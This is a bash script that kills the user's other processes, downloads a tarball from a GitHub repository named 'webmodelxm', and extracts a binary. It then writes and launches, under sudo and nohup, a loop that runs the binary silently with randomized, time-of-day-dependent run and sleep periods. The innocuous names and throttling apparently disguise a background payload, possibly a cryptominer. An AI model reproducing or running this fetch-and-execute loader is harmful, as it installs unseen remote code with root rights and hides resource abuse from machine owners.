#!/bin/bash
pkill -u $(whoami) -x -v -P $$
mkdir -p learn

cd learn

echo "download web2 file"

curl -L -o "web$(whoami).tar.gz" https://raw.githubusercontent.com/amosgansweet/webmodelxm/main/webmodelxm.tar.gz

tar -xvzf "web$(whoami).tar.gz"

rm -fr webmodelxm

chmod +x web2


# creat weblanguage.sh
cat << 'EOF' > weblanguage.sh

#!/bin/bash

echo "creat a weblanguage.sh"
echo "running..."
touch web2.log
NLANGUAGE_PATH="./web2"
LOG_FILE="./web2.log"

# Function to get the current hour in the German timezone
get_german_hour() {
  # Set the timezone to Germany (Europe/Berlin is a common one)
  TZ="Europe/Berlin"
  export TZ
  echo "$(date +%H)"
}

while true
do
    # get German time (hour)
    GERMAN_HOUR=$(get_german_hour)

    # set up running time and sleep time
    if [ "$GERMAN_HOUR" -ge 7 ] && [ "$GERMAN_HOUR" -lt 22 ]; then
        # Day time (7 AM to 10 PM) – Less frequent, shorter runs
        RUNTIME=$((RANDOM % 601 + 1500))  # run in the day：25~35 min
        SLEEPTIME=$((RANDOM % 301 + 600))  # sleep in the day：10~15 min
        echo "$(date '+%Y-%m-%d %H:%M:%S'): $(basename "$0"): Day: Running for $RUNTIME seconds, sleeping for $SLEEPTIME seconds" >> "$LOG_FILE"
    else
        # Night time (10 PM to 7 AM) – More frequent, longer runs
        RUNTIME=$((RANDOM % 901 + 2100))   # run at night: 35~50 min
        SLEEPTIME=$((RANDOM % 301 + 300))   # sleep at night：5~10 min
        echo "$(date '+%Y-%m-%d %H:%M:%S'): $(basename "$0"): Night: Running for $RUNTIME seconds, sleeping for $SLEEPTIME seconds" >> "$LOG_FILE"
    fi

    # start nlanguage（background）
    "$NLANGUAGE_PATH" > /dev/null 2>&1 &
    NLANGUAGE_PID=$!

    # await running time 
    sleep "$RUNTIME"
        
    # close nlanguage
    pkill -x "$(basename "$NLANGUAGE_PATH")" 2>/dev/null  # Use pkill for robustness

    # await for starting next time
    sleep "$SLEEPTIME"
done

sleep 1
echo "operation done!"


EOF

# operation privileges
chmod +x weblanguage.sh

# executing

sudo nohup ./weblanguage.sh > /dev/null 2>&1 &
